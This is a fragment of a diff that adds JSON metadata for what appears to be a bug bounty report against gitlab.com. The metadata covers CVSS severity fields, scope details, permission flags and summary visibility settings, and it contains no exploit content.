+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 18138,
+    "asset_type": "URL",
+    "asset_identifier": "gitlab.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
